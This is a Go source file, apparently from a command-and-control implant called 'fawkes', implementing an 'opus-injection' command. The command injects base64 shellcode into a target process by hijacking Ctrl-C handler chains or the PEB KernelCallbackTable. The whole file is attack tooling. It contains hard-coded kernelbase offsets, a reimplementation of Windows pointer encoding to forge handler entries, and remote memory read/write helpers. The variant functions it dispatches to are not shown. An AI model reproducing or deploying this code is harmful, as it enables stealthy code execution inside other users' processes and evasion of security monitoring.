//go:build windows
// +build windows

// Package commands provides the opus-injection command for novel callback-based process injection.
//
// Opus Injection explores Windows callback mechanisms that haven't been commonly weaponized.
// These techniques manipulate function pointer structures to achieve code execution through
// legitimate Windows API triggers.
//
// Currently supported variants:
//   - Variant 1: Ctrl-C Handler Chain Injection (console processes)
//   - Variant 4: PEB KernelCallbackTable Injection (GUI processes)
//
// Future variants planned:
//   - Variant 2: WNF (Windows Notification Facility) Callback Injection
//   - Variant 3: FLS (Fiber Local Storage) Callback Injection
package commands

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Opus-specific constants
const (
	// Console control events
	CTRL_C_EVENT        = 0
	CTRL_BREAK_EVENT    = 1
	CTRL_CLOSE_EVENT    = 2
	CTRL_LOGOFF_EVENT   = 5
	CTRL_SHUTDOWN_EVENT = 6
)

// Handler list offsets in kernelbase.dll (Windows 10/11)
// These were determined through reversing with WinDbg
const (
	// RVA offsets from kernelbase.dll base
	HandlerListRVA                = 0x399490 // Pointer to heap-allocated array of encoded handler pointers
	HandlerListLengthRVA          = 0x39CBB0 // DWORD: current number of handlers
	AllocatedHandlerListLengthRVA = 0x39CBB4 // DWORD: allocated array capacity
)

// ProcessCookie info class for NtQueryInformationProcess
const ProcessCookie = 36

// ProcessBasicInformation info class
const ProcessBasicInformation = 0

// Window message constants
const (
	WM_COPYDATA = 0x004A
)

// PEB offset for KernelCallbackTable (x64)
const PEBKernelCallbackTableOffset = 0x58

// COPYDATASTRUCT for WM_COPYDATA
type COPYDATASTRUCT struct {
	DwData uintptr
	CbData uint32
	LpData uintptr
}

// PROCESS_BASIC_INFORMATION for NtQueryInformationProcess
type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

var (
	ntdllOpus                       = windows.NewLazySystemDLL("ntdll.dll")
	user32Opus                      = windows.NewLazySystemDLL("user32.dll")
	procAttachConsole               = kernel32.NewProc("AttachConsole")
	procFreeConsole                 = kernel32.NewProc("FreeConsole")
	procAllocConsole                = kernel32.NewProc("AllocConsole")
	procGenerateConsoleCtrlEvent    = kernel32.NewProc("GenerateConsoleCtrlEvent")
	procNtQueryInformationProcessOp = ntdllOpus.NewProc("NtQueryInformationProcess")
	procFindWindowA                 = user32Opus.NewProc("FindWindowA")
	procFindWindowExA               = user32Opus.NewProc("FindWindowExA")
	procGetWindowTextA              = user32Opus.NewProc("GetWindowTextA")
	procGetWindowThreadProcessId    = user32Opus.NewProc("GetWindowThreadProcessId")
	procSendMessageA                = user32Opus.NewProc("SendMessageA")
)

// OpusInjectionCommand implements the opus-injection command
type OpusInjectionCommand struct{}

// Name returns the command name
func (c *OpusInjectionCommand) Name() string {
	return "opus-injection"
}

// Description returns the command description
func (c *OpusInjectionCommand) Description() string {
	return "Perform novel callback-based process injection using unexplored Windows mechanisms"
}

// OpusInjectionParams represents the parameters for opus-injection
type OpusInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the opus-injection command
func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	params, parseErr := unmarshalParams[OpusInjectionParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeOpusVariant1(shellcode, uint32(params.PID))
	case 4:
		output, err = executeOpusVariant4(shellcode, uint32(params.PID))
	default:
		return errorf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
	}

	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
	}

	return successResult(output)
}

// findWindowByPID finds a window handle for a given process ID
func findWindowByPID(targetPID uint32) (uintptr, error) {
	var foundHwnd uintptr
	var currentHwnd uintptr

	// Enumerate all top-level windows
	for {
		ret, _, _ := procFindWindowExA.Call(
			0,           // hWndParent (desktop)
			currentHwnd, // hWndChildAfter (previous window)
			0,           // lpClassName (any)
			0,           // lpWindowName (any)
		)

		if ret == 0 {
			break // No more windows
		}

		currentHwnd = ret

		// Get window's process ID
		var windowPID uint32
		procGetWindowThreadProcessId.Call(
			currentHwnd,
			uintptr(unsafe.Pointer(&windowPID)),
		)

		if windowPID == targetPID {
			foundHwnd = currentHwnd
			break
		}
	}

	if foundHwnd == 0 {
		return 0, fmt.Errorf("no window found for PID %d", targetPID)
	}

	return foundHwnd, nil
}

// stringsEqualFold compares strings case-insensitively
func stringsEqualFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}

// getProcessCookie retrieves the process cookie via NtQueryInformationProcess(ProcessCookie)
func getProcessCookie(hProcess windows.Handle) (uint32, error) {
	var cookie uint32
	var returnLength uint32

	status, _, _ := procNtQueryInformationProcessOp.Call(
		uintptr(hProcess),
		uintptr(ProcessCookie), // Info class 36
		uintptr(unsafe.Pointer(&cookie)),
		uintptr(4), // DWORD size
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess(ProcessCookie) failed: 0x%X", status)
	}

	return cookie, nil
}

// encodePointer implements RtlEncodePointer algorithm
// Encoding: (pointer XOR cookie) ROR (cookie & 0x3F)
func encodePointer(ptr uintptr, cookie uint32) uintptr {
	// XOR with cookie (zero-extended to 64-bit)
	result := ptr ^ uintptr(cookie)

	// Rotate right by (cookie & 0x3F) bits
	rotateAmount := cookie & 0x3F
	if rotateAmount > 0 {
		result = (result >> rotateAmount) | (result << (64 - rotateAmount))
	}

	return result
}

// readProcessMemoryPtr reads a pointer-sized value from remote process
func readProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value *uintptr) error {
	var bytesRead uintptr
	buf := make([]byte, 8)
	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 8, &bytesRead)
	if err != nil {
		return fmt.Errorf("reading process memory pointer at 0x%x: %w", addr, err)
	}
	*value = *(*uintptr)(unsafe.Pointer(&buf[0]))
	return nil
}

// readProcessMemoryDword reads a DWORD value from remote process
func readProcessMemoryDword(hProcess windows.Handle, addr uintptr, value *uint32) error {
	var bytesRead uintptr
	buf := make([]byte, 4)
	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 4, &bytesRead)
	if err != nil {
		return fmt.Errorf("reading process memory DWORD at 0x%x: %w", addr, err)
	}
	*value = *(*uint32)(unsafe.Pointer(&buf[0]))
	return nil
}

// writeProcessMemoryPtr writes a pointer-sized value to remote process
func writeProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value uintptr) error {
	var bytesWritten uintptr
	buf := (*[8]byte)(unsafe.Pointer(&value))[:]
	return windows.WriteProcessMemory(hProcess, addr, &buf[0], 8, &bytesWritten)
}

// writeProcessMemoryDword writes a DWORD value to remote process
func writeProcessMemoryDword(hProcess windows.Handle, addr uintptr, value uint32) error {
	var bytesWritten uintptr
	buf := (*[4]byte)(unsafe.Pointer(&value))[:]
	return windows.WriteProcessMemory(hProcess, addr, &buf[0], 4, &bytesWritten)
}
